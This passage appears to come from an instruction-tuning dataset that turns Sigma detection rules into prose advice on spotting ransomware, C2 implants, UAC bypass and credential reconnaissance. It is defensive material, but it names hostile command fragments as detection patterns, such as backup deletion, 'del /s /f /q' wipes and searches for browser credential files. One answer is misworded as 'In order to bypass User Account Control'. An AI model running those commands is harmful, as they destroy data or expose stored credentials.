      "answer": "In order to detect the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation, you should: Monitor Windows driver load logs for instances where command execution patterns match those often used by attackers to escalate privileges or gain system access. Specifically, look out for the loading of services where the image path includes executions via 'cmd', '%COMSPEC%', or 'cmd.exe' followed by '/c', 'echo', and targeted at 'pipe' directories, indicative of Meterpreter and Cobalt Strike activities. Another technique involves observing 'rundll32' executions that load DLL files with a particular focus on patterns that include '.dll,a' and '/p:', which are characteristic of a method to execute malicious code within a seemingly benign process. The log entries to scrutinize should contain the computer name, the domain name, and the username under which the activity was initiated, along with the precise image path used in the operation. Given the critical nature of this detection and its tie to advanced persistent threat tactics, false positives are considered highly unlikely."
    }
  },
  {
    "instruction": "How to detect: WannaCry ransomware activity",
    "context": "",
    "output": "In order to detect WannaCry ransomware activity, you should focus on monitoring process creations within Windows environments. Look for certain indicators of compromise based on the names of executables and specific command line arguments that WannaCry is known to use.\n\nFor detection, pay attention to processes that have been created with names ending in specific strings such as '\\tasksche.exe', '\\mssecsvc.exe', '\\taskdl.exe', '\\taskhsvc.exe', '\\taskse.exe', '\\111.exe', '\\lhdfrgui.exe', '\\linuxnew.exe', and '\\wannacry.exe'. Additionally, any process names containing 'WanaDecryptor' should raise an alert as it is directly associated with the ransomware's decryption tool.\n\nMoreover, specific command lines used by WannaCry for facilitating its spread and payload execution should be monitored. These include commands executing 'icacls' with parameters to grant full access permissions to everyone, 'bcdedit' commands modifying boot configuration to prevent recovery mode, 'wbadmin' commands used to delete backup catalogs silently, and any reference to '@Please_Read_Me@.txt', which is a ransom note dropped by the ransomware.\n\nIf any of these indicators are observed, it is critical to investigate further as they signify potential WannaCry ransomware infection. Monitoring both the names of processes and the specific command line arguments used provides a focused approach to detecting this form of ransomware activity effectively.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "WannaCry ransomware activity",
      "answer": "In order to detect WannaCry ransomware activity, you should focus on monitoring process creations within Windows environments. Look for certain indicators of compromise based on the names of executables and specific command line arguments that WannaCry is known to use.\n\nFor detection, pay attention to processes that have been created with names ending in specific strings such as '\\tasksche.exe', '\\mssecsvc.exe', '\\taskdl.exe', '\\taskhsvc.exe', '\\taskse.exe', '\\111.exe', '\\lhdfrgui.exe', '\\linuxnew.exe', and '\\wannacry.exe'. Additionally, any process names containing 'WanaDecryptor' should raise an alert as it is directly associated with the ransomware's decryption tool.\n\nMoreover, specific command lines used by WannaCry for facilitating its spread and payload execution should be monitored. These include commands executing 'icacls' with parameters to grant full access permissions to everyone, 'bcdedit' commands modifying boot configuration to prevent recovery mode, 'wbadmin' commands used to delete backup catalogs silently, and any reference to '@Please_Read_Me@.txt', which is a ransom note dropped by the ransomware.\n\nIf any of these indicators are observed, it is critical to investigate further as they signify potential WannaCry ransomware infection. Monitoring both the names of processes and the specific command line arguments used provides a focused approach to detecting this form of ransomware activity effectively."
    }
  },
  {
    "instruction": "Please help me detect the following: an appx package added the pipeline of the \"to be processed\" packages which is located in suspicious locations",
    "context": "",
    "output": "Sure!\nIn order to detect an appx package added to the pipeline of the \"to be processed\" packages which is located in suspicious locations, you should monitor for specific events and paths within the Windows AppX deployment server logs. Specifically, look for event ID 854, which indicates an operation related to appx package processing. Pay close attention to any appx package activities that involve file paths commonly associated with user content, temp directories, or download folders. These include paths starting with 'C:\\Users\\Public\\', '/users/public/', 'C:\\PerfLogs\\', 'C:/perflogs/', involving desktop directories ('Desktop'), download directories ('Downloads'), or temporary file locations within the 'Windows\\Temp\\' folder and similar paths in the user's AppData Local Temp directory. Any hits on these criteria should be investigated as they could be indicative of malicious software attempting to exploit the appx deployment process by placing packages in locations that are not typically used for legitimate purposes. The detectors should consider all such alerts as potentially serious and warranting further examination, although be aware that due to the broad nature of these paths, there may be unknown false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "an appx package added the pipeline of the \"to be processed\" packages which is located in suspicious locations",
      "answer": "In order to detect an appx package added to the pipeline of the \"to be processed\" packages which is located in suspicious locations, you should monitor for specific events and paths within the Windows AppX deployment server logs. Specifically, look for event ID 854, which indicates an operation related to appx package processing. Pay close attention to any appx package activities that involve file paths commonly associated with user content, temp directories, or download folders. These include paths starting with 'C:\\Users\\Public\\', '/users/public/', 'C:\\PerfLogs\\', 'C:/perflogs/', involving desktop directories ('Desktop'), download directories ('Downloads'), or temporary file locations within the 'Windows\\Temp\\' folder and similar paths in the user's AppData Local Temp directory. Any hits on these criteria should be investigated as they could be indicative of malicious software attempting to exploit the appx deployment process by placing packages in locations that are not typically used for legitimate purposes. The detectors should consider all such alerts as potentially serious and warranting further examination, although be aware that due to the broad nature of these paths, there may be unknown false positives."
    }
  },
  {
    "instruction": "How to detect: Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification",
    "context": "",
    "output": "In order to bypass User Account Control using Event Viewer and a relevant Windows Registry modification, you should: Monitor registry set actions within Windows environments, specifically focusing on events where a SetValue operation occurs. This operation is crucial to watch as it could indicate an attempt to modify system settings through the registry that are unauthorized and potentially malicious. Key to identifying suspicious activity is the alteration of the registry key ending with '\\_Classes\\mscfile\\shell\\open\\command\\(Default)'. This specific modification is a known technique used by attackers to intercept and manipulate how certain administrative tools, like the Event Viewer, operate, effectively circumventing User Account Control mechanisms.\n\nYou must filter out benign modifications to this registry value, which are commonly identified by their details starting with '%SystemRoot%\\system32\\mmc.exe \"%1\" %'. These are typical configurations that should not be flagged as suspicious. However, any modification to this registry key not fitting this pattern should be considered a potential security threat. \n\nNo specific false positives have been identified, indicating that while the criteria are tightly defined, scrutiny of alerts is recommended to ensure they truly represent malicious activity. The severity level for this kind of detection has been classified as high due to the risk associated with successful bypasses of User Account Control, emphasizing the importance of prompt and effective response. \n\nMaintain vigilance for such registry modifications as part of your cyber defense strategy to protect against this sophisticated method of gaining elevated privileges without triggering standard security alerts.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification",
      "answer": "In order to bypass User Account Control using Event Viewer and a relevant Windows Registry modification, you should: Monitor registry set actions within Windows environments, specifically focusing on events where a SetValue operation occurs. This operation is crucial to watch as it could indicate an attempt to modify system settings through the registry that are unauthorized and potentially malicious. Key to identifying suspicious activity is the alteration of the registry key ending with '\\_Classes\\mscfile\\shell\\open\\command\\(Default)'. This specific modification is a known technique used by attackers to intercept and manipulate how certain administrative tools, like the Event Viewer, operate, effectively circumventing User Account Control mechanisms.\n\nYou must filter out benign modifications to this registry value, which are commonly identified by their details starting with '%SystemRoot%\\system32\\mmc.exe \"%1\" %'. These are typical configurations that should not be flagged as suspicious. However, any modification to this registry key not fitting this pattern should be considered a potential security threat. \n\nNo specific false positives have been identified, indicating that while the criteria are tightly defined, scrutiny of alerts is recommended to ensure they truly represent malicious activity. The severity level for this kind of detection has been classified as high due to the risk associated with successful bypasses of User Account Control, emphasizing the importance of prompt and effective response. \n\nMaintain vigilance for such registry modifications as part of your cyber defense strategy to protect against this sophisticated method of gaining elevated privileges without triggering standard security alerts."
    }
  },
  {
    "instruction": "How can I detect: large DNS domain names",
    "context": "",
    "output": "In order to detect large DNS domain names, you should focus on DNS logs to identify queries where the domain name exceeds 70 bytes in length. This detection method is crucial for identifying potential malicious activity, as excessively long domain names can be indicative of an attack or an attempt to evade simple detection mechanisms. It's important to filter out queries to a list of well-known domains such as `akadns.net`, `akamaiedge.net`, `amazonaws.com`, `apple.com`, `apple-dns.net`, `cloudfront.net`, `icloud.com`, `in-addr.arpa`, `google.com`, `yahoo.com`, `dropbox.com`, `windowsupdate.com`, `microsoftonline.com`, `s-microsoft.com`, `office365.com`, and `linkedin.com` to avoid false positives. These domains are generally trusted, and queries to them, even if they are large, are likely to be legitimate.\n\nHowever, any large domain queries outside of these well-established domains should be noted and investigated further due to the high potential of being linked to malicious activities. It's also advisable to maintain a whitelist to add any legitimate domains requested that may initially trigger this detection condition but upon review, are deemed safe. This helps in refining the detection process and reducing false positives over time. The emphasis on detecting large DNS domain names is associated with identifying potentially harmful activities that leverage DNS, making it a high-level concern for cybersecurity efforts.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "large DNS domain names",
      "answer": "In order to detect large DNS domain names, you should focus on DNS logs to identify queries where the domain name exceeds 70 bytes in length. This detection method is crucial for identifying potential malicious activity, as excessively long domain names can be indicative of an attack or an attempt to evade simple detection mechanisms. It's important to filter out queries to a list of well-known domains such as `akadns.net`, `akamaiedge.net`, `amazonaws.com`, `apple.com`, `apple-dns.net`, `cloudfront.net`, `icloud.com`, `in-addr.arpa`, `google.com`, `yahoo.com`, `dropbox.com`, `windowsupdate.com`, `microsoftonline.com`, `s-microsoft.com`, `office365.com`, and `linkedin.com` to avoid false positives. These domains are generally trusted, and queries to them, even if they are large, are likely to be legitimate.\n\nHowever, any large domain queries outside of these well-established domains should be noted and investigated further due to the high potential of being linked to malicious activities. It's also advisable to maintain a whitelist to add any legitimate domains requested that may initially trigger this detection condition but upon review, are deemed safe. This helps in refining the detection process and reducing false positives over time. The emphasis on detecting large DNS domain names is associated with identifying potentially harmful activities that leverage DNS, making it a high-level concern for cybersecurity efforts."
    }
  },
  {
    "instruction": "Explain how should I detect the following: Adversaries may enumerate browser bookmarks to learn more about compromised hosts.\nBrowser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about\ninternal network resources such as servers, tools/dashboards, or other related infrastructure.\n",
    "context": "",
    "output": "In order to detect adversaries attempting to enumerate browser bookmarks to learn more about compromised hosts, you should focus on monitoring Windows process creation events for indications of this specific activity. Look for the execution of \"where.exe\" which is a command-line utility in Windows used to locate files within the system directories. In the context of this attack, \"where.exe\" might be misused to find specific browser data files. The files of interest include browser-specific SQLite databases and JSON files such as 'places.sqlite', 'cookies.sqlite', 'formhistory.sqlite', 'logins.json', 'key4.db', 'key3.db', and 'sessionstore.jsonlz4' for Firefox, as well as 'History', 'Bookmarks', 'Cookies', and 'Login Data' for Chrome. These files contain sensitive information like bookmarks, cookies, and login data which, if accessed, can provide adversaries with insights about personal user interests, banking information, social media, and internal network resources.\n\nWhen setting up detection mechanisms, include rules that trigger alarms for process creation events where the command line includes attempts to locate any of these critical files. This approach ensures you can identify potential reconnaissance efforts aimed at gathering browser bookmarks and related information.\n\nKeep in mind that while this detection strategy is vital for catching suspicious activities, it might also generate false positives, as the usage of \"where.exe\" is not exclusively malicious and could be part of regular system or administrative tasks. Therefore, it's recommended to verify such detection hits with further investigation. The monitoring strategy encompasses tags associated with MITRE ATT&CK tactics and techniques such as Credential Access, Discovery, and Collection, as interacting with these browser data files can relate to these categories of attack techniques.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Adversaries may enumerate browser bookmarks to learn more about compromised hosts.\nBrowser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about\ninternal network resources such as servers, tools/dashboards, or other related infrastructure.\n",
      "answer": "In order to detect adversaries attempting to enumerate browser bookmarks to learn more about compromised hosts, you should focus on monitoring Windows process creation events for indications of this specific activity. Look for the execution of \"where.exe\" which is a command-line utility in Windows used to locate files within the system directories. In the context of this attack, \"where.exe\" might be misused to find specific browser data files. The files of interest include browser-specific SQLite databases and JSON files such as 'places.sqlite', 'cookies.sqlite', 'formhistory.sqlite', 'logins.json', 'key4.db', 'key3.db', and 'sessionstore.jsonlz4' for Firefox, as well as 'History', 'Bookmarks', 'Cookies', and 'Login Data' for Chrome. These files contain sensitive information like bookmarks, cookies, and login data which, if accessed, can provide adversaries with insights about personal user interests, banking information, social media, and internal network resources.\n\nWhen setting up detection mechanisms, include rules that trigger alarms for process creation events where the command line includes attempts to locate any of these critical files. This approach ensures you can identify potential reconnaissance efforts aimed at gathering browser bookmarks and related information.\n\nKeep in mind that while this detection strategy is vital for catching suspicious activities, it might also generate false positives, as the usage of \"where.exe\" is not exclusively malicious and could be part of regular system or administrative tasks. Therefore, it's recommended to verify such detection hits with further investigation. The monitoring strategy encompasses tags associated with MITRE ATT&CK tactics and techniques such as Credential Access, Discovery, and Collection, as interacting with these browser data files can relate to these categories of attack techniques."
    }
  },
  {
    "instruction": "Explain how should I detect the following: process activity patterns as seen being used by Sliver C2 framework implants",
    "context": "",
    "output": "In order to detect process activity patterns as seen being used by Sliver C2 framework implants, you should monitor for specific command line activity within process creation logs on Windows systems. Look for processes initiated with the command line parameter `-NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8`. This particular string indicates an attempt to keep the PowerShell console open after executing a command and setting the console's output encoding to UTF-8, a technique observed in the behavior of Sliver C2 framework implants used by attackers for maintaining persistence and command and control communications. The occurrence of this command is considered critical and it's unlikely to result in false positives, indicating a strong sign of a potential compromise or attack in progress.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "process activity patterns as seen being used by Sliver C2 framework implants",
      "answer": "In order to detect process activity patterns as seen being used by Sliver C2 framework implants, you should monitor for specific command line activity within process creation logs on Windows systems. Look for processes initiated with the command line parameter `-NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8`. This particular string indicates an attempt to keep the PowerShell console open after executing a command and setting the console's output encoding to UTF-8, a technique observed in the behavior of Sliver C2 framework implants used by attackers for maintaining persistence and command and control communications. The occurrence of this command is considered critical and it's unlikely to result in false positives, indicating a strong sign of a potential compromise or attack in progress."
    }
  },
  {
    "instruction": "Can you explain how to detect: all the rules have been deleted from the Windows Defender Firewall configuration",
    "context": "",
    "output": "Certainly!\n\nIn order to detect when all the rules have been deleted from the Windows Defender Firewall configuration, you should monitor Windows firewall log sources, specifically focusing on events indicating that all rules have been cleared. This involves keeping an eye out for EventIDs 2033 and 2059, which signify the removal of all configuration rules in Windows Defender Firewall on Windows 10 and Windows 11 systems respectively. \n\nYou should also apply filters to distinguish between legitimate and suspicious activities. If the modification comes from applications located in \"C:\\Program Files\\\" or \"C:\\Program Files (x86)\\\", these are typically considered as more trustworthy locations, indicating that the change might be legitimate. Similarly, adjustments originating from \"C:\\Windows\\System32\\svchost.exe\", a core system process, should be scrutinized differently than those coming from less trusted sources. Additionally, modifications from \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\\" ending with \"\\MsMpEng.exe\" are related to legitimate Windows Defender operations and are likely not malicious.\n\nThe main condition to identify an attack is the deletion of all firewall rules without any of these filters being met, signaling that the modifications are potentially coming from a nefarious source or method. Tags indicating the MITRE ATT&CK tactics related to this activity include Defense Evasion, where an adversary might clear firewall rules to prevent network-based defenses from detecting or stopping communication with command and control servers or to facilitate lateral movement within the network without being blocked by the host's defensive mechanisms.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "all the rules have been deleted from the Windows Defender Firewall configuration",
      "answer": "In order to detect when all the rules have been deleted from the Windows Defender Firewall configuration, you should monitor Windows firewall log sources, specifically focusing on events indicating that all rules have been cleared. This involves keeping an eye out for EventIDs 2033 and 2059, which signify the removal of all configuration rules in Windows Defender Firewall on Windows 10 and Windows 11 systems respectively. \n\nYou should also apply filters to distinguish between legitimate and suspicious activities. If the modification comes from applications located in \"C:\\Program Files\\\" or \"C:\\Program Files (x86)\\\", these are typically considered as more trustworthy locations, indicating that the change might be legitimate. Similarly, adjustments originating from \"C:\\Windows\\System32\\svchost.exe\", a core system process, should be scrutinized differently than those coming from less trusted sources. Additionally, modifications from \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\\" ending with \"\\MsMpEng.exe\" are related to legitimate Windows Defender operations and are likely not malicious.\n\nThe main condition to identify an attack is the deletion of all firewall rules without any of these filters being met, signaling that the modifications are potentially coming from a nefarious source or method. Tags indicating the MITRE ATT&CK tactics related to this activity include Defense Evasion, where an adversary might clear firewall rules to prevent network-based defenses from detecting or stopping communication with command and control servers or to facilitate lateral movement within the network without being blocked by the host's defensive mechanisms."
    }
  },
  {
    "instruction": "Can you explain how to detect: application security group is modified or deleted.",
    "context": "",
    "output": "Certainly!\n\nIn order to identify when an application security group is modified or deleted, you should monitor Azure activity logs for signs of unauthorized or suspicious modifications or deletions of application security groups. Specifically, look for operations named MICROSOFT.NETWORK/APPLICATIONSECURITYGROUPS/WRITE and MICROSOFT.NETWORK/APPLICATIONSECURITYGROUPS/DELETE. These operations indicate that an application security group has either been modified or deleted. It\u2019s crucial to assess the context of these actions. Normally, system administrators perform these operations as part of legitimate maintenance or configuration tasks. Therefore, it's important to verify the user identity, user agent, and hostname involved in these operations to ensure they align with expected activities within your environment. Unauthorized modifications or deletions can serve as indicators of malicious activity, possibly indicating a threat actor's attempt to alter security controls to bypass network security measures. Investigate any modifications or deletions carried out by unfamiliar users, as these are more likely to indicate malicious activity. If certain activities are causing false positives because they are known and legitimate behaviors within your environment, you may consider exempting them from monitoring under this criterion to enhance the accuracy of your detection efforts. This proactive approach helps in maintaining the integrity and security of your network infrastructure by promptly identifying and responding to unauthorized changes in application security groups.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "application security group is modified or deleted.",
      "answer": "In order to identify when an application security group is modified or deleted, you should monitor Azure activity logs for signs of unauthorized or suspicious modifications or deletions of application security groups. Specifically, look for operations named MICROSOFT.NETWORK/APPLICATIONSECURITYGROUPS/WRITE and MICROSOFT.NETWORK/APPLICATIONSECURITYGROUPS/DELETE. These operations indicate that an application security group has either been modified or deleted. It\u2019s crucial to assess the context of these actions. Normally, system administrators perform these operations as part of legitimate maintenance or configuration tasks. Therefore, it's important to verify the user identity, user agent, and hostname involved in these operations to ensure they align with expected activities within your environment. Unauthorized modifications or deletions can serve as indicators of malicious activity, possibly indicating a threat actor's attempt to alter security controls to bypass network security measures. Investigate any modifications or deletions carried out by unfamiliar users, as these are more likely to indicate malicious activity. If certain activities are causing false positives because they are known and legitimate behaviors within your environment, you may consider exempting them from monitoring under this criterion to enhance the accuracy of your detection efforts. This proactive approach helps in maintaining the integrity and security of your network infrastructure by promptly identifying and responding to unauthorized changes in application security groups."
    }
  },
  {
    "instruction": "Can you explain how to detect: execution from an Alternate Data Stream (ADS). Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection",
    "context": "",
    "output": "Certainly!\n\nIn order to detect execution from an Alternate Data Stream (ADS), where adversaries may use NTFS file attributes to hide their malicious data in order to evade detection, you should monitor process creation logs on Windows systems for specific command-line patterns. Look for instances where the command line contains 'txt:', which indicates potential access or interaction with an alternate data stream. Additionally, be alert for command lines that combine certain tools and parameters, such as:\n\n- Use of 'type ' along with redirection '> ', which may suggest an attempt to display or redirect the contents of a file, possibly involving an ADS.\n- Execution involving 'makecab ' followed by '.cab', which could indicate compression of files into a Cabinet file, potentially to disguise malicious activity.\n- Commands starting with 'reg ' followed by ' export ', suggesting attempts to export registry keys, possibly for analysis or manipulation outside of standard registry tools.\n- Utilization of 'regedit ' with ' /E ', indicating export operations via Registry Editor, again potentially for malicious manipulation.\n- Execution of 'esentutl ' accompanied by '/y', '/d', and '/o' flags, which points to attempts to copy, defragment, or repair Extensible Storage Engine databases, potentially indicating more sophisticated adversary behavior involving data manipulation or extraction.\n\nIn essence, by monitoring for these specific command-line activities within process creation events, one can uncover potential misuse of alternate data streams by adversaries aiming to execute or hide malicious data, supporting efforts to evade detection. This monitoring approach crucially targets a range of tools and operations that could be exploited for such purposes.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution from an Alternate Data Stream (ADS). Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection",
      "answer": "In order to detect execution from an Alternate Data Stream (ADS), where adversaries may use NTFS file attributes to hide their malicious data in order to evade detection, you should monitor process creation logs on Windows systems for specific command-line patterns. Look for instances where the command line contains 'txt:', which indicates potential access or interaction with an alternate data stream. Additionally, be alert for command lines that combine certain tools and parameters, such as:\n\n- Use of 'type ' along with redirection '> ', which may suggest an attempt to display or redirect the contents of a file, possibly involving an ADS.\n- Execution involving 'makecab ' followed by '.cab', which could indicate compression of files into a Cabinet file, potentially to disguise malicious activity.\n- Commands starting with 'reg ' followed by ' export ', suggesting attempts to export registry keys, possibly for analysis or manipulation outside of standard registry tools.\n- Utilization of 'regedit ' with ' /E ', indicating export operations via Registry Editor, again potentially for malicious manipulation.\n- Execution of 'esentutl ' accompanied by '/y', '/d', and '/o' flags, which points to attempts to copy, defragment, or repair Extensible Storage Engine databases, potentially indicating more sophisticated adversary behavior involving data manipulation or extraction.\n\nIn essence, by monitoring for these specific command-line activities within process creation events, one can uncover potential misuse of alternate data streams by adversaries aiming to execute or hide malicious data, supporting efforts to evade detection. This monitoring approach crucially targets a range of tools and operations that could be exploited for such purposes."
    }
  },
  {
    "instruction": "How can I detect: system changes made by Blue Mockingbird",
    "context": "",
    "output": "In order to detect system changes made by Blue Mockingbird, you should monitor the Windows Registry for specific modifications that are indicative of this attack. Specifically, focus on the registry setting events where the value is being set (Setvalue EventType). The critical alteration to lookout for occurs in the registry key path that ends with '\\CurrentControlSet\\Services\\wercplsupport\\Parameters\\ServiceDll'. This particular change is a common tactic used by Blue Mockingbird to achieve persistence and control over a compromised system by potentially modifying the referenced DLL to one under their control. \n\nMonitoring for such alterations will require configuring your security systems to log and alert whenever this type of registry modification occurs. It's important to be aware that, as of the knowledge available, there are no known false positives associated with this detection strategy, indicating a high level of confidence in these specific modifications as indicators of Blue Mockingbird activity. However, always exercise caution and investigate alerts thoroughly to confirm malicious activity. This detection strategy is of high importance due to the direct association with Blue Mockingbird's technique for maintaining persistence and potentially executing unauthorized commands or software on the system.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "system changes made by Blue Mockingbird",
      "answer": "In order to detect system changes made by Blue Mockingbird, you should monitor the Windows Registry for specific modifications that are indicative of this attack. Specifically, focus on the registry setting events where the value is being set (Setvalue EventType). The critical alteration to lookout for occurs in the registry key path that ends with '\\CurrentControlSet\\Services\\wercplsupport\\Parameters\\ServiceDll'. This particular change is a common tactic used by Blue Mockingbird to achieve persistence and control over a compromised system by potentially modifying the referenced DLL to one under their control. \n\nMonitoring for such alterations will require configuring your security systems to log and alert whenever this type of registry modification occurs. It's important to be aware that, as of the knowledge available, there are no known false positives associated with this detection strategy, indicating a high level of confidence in these specific modifications as indicators of Blue Mockingbird activity. However, always exercise caution and investigate alerts thoroughly to confirm malicious activity. This detection strategy is of high importance due to the direct association with Blue Mockingbird's technique for maintaining persistence and potentially executing unauthorized commands or software on the system."
    }
  },
  {
    "instruction": "Can you explain how to detect: creation of a named pipe as used by CobaltStrike",
    "context": "",
    "output": "Certainly!\n\nIn order to detect the creation of a named pipe as used by CobaltStrike, you should: Focus on monitoring the creation of Windows named pipes which could indicate malicious activity. Ensure your monitoring tools, especially those analyzing logs from Windows systems, are configured to capture Named Pipe Events, specifically looking for Event IDs 17 and 18 in Sysmon logs. This requires verifying if your Sysmon configuration actively logs these events, and adjustments might be necessary using popular configurations found on GitHub. \n\nDuring detection, pay close attention to the pipe names. If a pipe name contains both '\\MSSE-' and '-server', starts with '\\postex_', '\\status_', '\\msagent_', '\\mojo_', '\\interprocess_', '\\samr_', '\\netlogon_', '\\srvsvc_', '\\lsarpc_', '\\wkssvc_', it could indicate a compromised system. These specific patterns are chosen because they are commonly utilized by Cobalt Strike and other malware to establish communication channels on the infected host.\n\nRemember that while this strategy is critical for identifying potential threats, there might be cases where legitimate software uses similar named pipes, leading to unknown false positives. Thus, it\u2019s crucial to analyze detections within the broader context of behavior on the system to accurately identify malicious activity.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "creation of a named pipe as used by CobaltStrike",
      "answer": "In order to detect the creation of a named pipe as used by CobaltStrike, you should: Focus on monitoring the creation of Windows named pipes which could indicate malicious activity. Ensure your monitoring tools, especially those analyzing logs from Windows systems, are configured to capture Named Pipe Events, specifically looking for Event IDs 17 and 18 in Sysmon logs. This requires verifying if your Sysmon configuration actively logs these events, and adjustments might be necessary using popular configurations found on GitHub. \n\nDuring detection, pay close attention to the pipe names. If a pipe name contains both '\\MSSE-' and '-server', starts with '\\postex_', '\\status_', '\\msagent_', '\\mojo_', '\\interprocess_', '\\samr_', '\\netlogon_', '\\srvsvc_', '\\lsarpc_', '\\wkssvc_', it could indicate a compromised system. These specific patterns are chosen because they are commonly utilized by Cobalt Strike and other malware to establish communication channels on the infected host.\n\nRemember that while this strategy is critical for identifying potential threats, there might be cases where legitimate software uses similar named pipes, leading to unknown false positives. Thus, it\u2019s crucial to analyze detections within the broader context of behavior on the system to accurately identify malicious activity."
    }
  },
  {
    "instruction": "How can I detect: Ryuk ransomware activity",
    "context": "",
    "output": "In order to detect Ryuk ransomware activity, you should focus on monitoring Windows process creation events with specific attention to the following suspicious activities indicative of Ryuk's behavior: \n\n1. Look for processes that are creating or modifying the startup items within the Windows Registry, specifically targeting the 'Microsoft\\Windows\\CurrentVersion\\Run' registry path in combination with any activity in the 'C:\\users\\Public\\' directory. This could indicate an attempt to achieve persistence on a victim's device by ensuring the malicious code executes every time the computer is restarted.\n\n2. Be alert for the deletion commands that attempt to forcefully and quietly remove backup files (such as those with extensions .bac, .bak, .bkf) from the root of the C: drive. The use of 'del /s /f /q c:\\' followed by these file types is a technique used by Ryuk to hinder recovery from the attack by destroying backup files.\n\n3. Monitor for improper use of network management tools, particularly 'net.exe' or 'net1.exe'. Focus especially on commands that stop services forcefully, as indicated by the presence of ' stop ' and ' /y' in the command line, accompanied by service names commonly targeted by Ryuk for disruption ('samss', 'audioendpointbuilder', 'unistoresvc_', 'AcrSch2Svc'). This is part of Ryuk's strategy to destabilize systems or disable security services, making it easier for the ransomware to encrypt files without being detected.\n\nActivities that match any one of these patterns should be investigated as they signify a high likelihood of Ryuk ransomware activity. Due to the severity and the targeted destruction or manipulation tactics involved, instances flagged by these criteria are considered highly suspicious and unlikely to be false positives. The focus should be on capturing and analyzing the command lines used in process creation events that match these patterns to effectively detect and respond to potential Ryuk ransomware attacks.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Ryuk ransomware activity",
      "answer": "In order to detect Ryuk ransomware activity, you should focus on monitoring Windows process creation events with specific attention to the following suspicious activities indicative of Ryuk's behavior: \n\n1. Look for processes that are creating or modifying the startup items within the Windows Registry, specifically targeting the 'Microsoft\\Windows\\CurrentVersion\\Run' registry path in combination with any activity in the 'C:\\users\\Public\\' directory. This could indicate an attempt to achieve persistence on a victim's device by ensuring the malicious code executes every time the computer is restarted.\n\n2. Be alert for the deletion commands that attempt to forcefully and quietly remove backup files (such as those with extensions .bac, .bak, .bkf) from the root of the C: drive. The use of 'del /s /f /q c:\\' followed by these file types is a technique used by Ryuk to hinder recovery from the attack by destroying backup files.\n\n3. Monitor for improper use of network management tools, particularly 'net.exe' or 'net1.exe'. Focus especially on commands that stop services forcefully, as indicated by the presence of ' stop ' and ' /y' in the command line, accompanied by service names commonly targeted by Ryuk for disruption ('samss', 'audioendpointbuilder', 'unistoresvc_', 'AcrSch2Svc'). This is part of Ryuk's strategy to destabilize systems or disable security services, making it easier for the ransomware to encrypt files without being detected.\n\nActivities that match any one of these patterns should be investigated as they signify a high likelihood of Ryuk ransomware activity. Due to the severity and the targeted destruction or manipulation tactics involved, instances flagged by these criteria are considered highly suspicious and unlikely to be false positives. The focus should be on capturing and analyzing the command lines used in process creation events that match these patterns to effectively detect and respond to potential Ryuk ransomware attacks."
    }
  },
  {
    "instruction": "Please help me detect the following: files seen being requested by RomCom while potentially exploiting CVE-2023-36884",
    "context": "",
    "output": "Sure!\nIn order to detect files seen being requested by RomCom while potentially exploiting CVE-2023-36884, you should: Monitor proxy logs for GET requests to specific URLs that contain the following paths: '/ex001.url', '/file001.search-ms', '/file001.url', '/file001.vbs', '/file1.mht', '/o2010.asp', '/redir_obj.html', '/RFile.asp', '/zip_k.asp', '/zip_k2.asp', and '/zip_k3.asp'. These files are indicative of attempt to exploit this vulnerability, and detecting requests for them can alert you to potential malicious activity. The detection level for these activities is set at medium due to the possibility of unknown false positives, outlining the need for further investigation upon alert.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "files seen being requested by RomCom while potentially exploiting CVE-2023-36884",
      "answer": "In order to detect files seen being requested by RomCom while potentially exploiting CVE-2023-36884, you should: Monitor proxy logs for GET requests to specific URLs that contain the following paths: '/ex001.url', '/file001.search-ms', '/file001.url', '/file001.vbs', '/file1.mht', '/o2010.asp', '/redir_obj.html', '/RFile.asp', '/zip_k.asp', '/zip_k2.asp', and '/zip_k3.asp'. These files are indicative of attempt to exploit this vulnerability, and detecting requests for them can alert you to potential malicious activity. The detection level for these activities is set at medium due to the possibility of unknown false positives, outlining the need for further investigation upon alert."
    }
  },
  {
    "instruction": "How to detect: usage of utilities such as 'systemctl', 'service'...etc to stop or disable tools and services",
    "context": "",
    "output": "In order to detect the usage of utilities such as 'systemctl', 'service'...etc to stop or disable tools and services, you should: focus on monitoring process creation events within Linux systems. Specifically, watch for processes that are being initiated whose image names end with '/service', '/systemctl', or '/chkconfig'. Furthermore, scrutinize the command line arguments of these processes for the presence of strings such as 'stop' or 'disable', which indicate an attempt to halt or deactivate certain system services or tools. Be mindful, however, that such activities could also originate from legitimate administration tasks. This detection operates at a medium severity level, suggesting a balanced approach to alerting to avoid overwhelming security personnel with false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
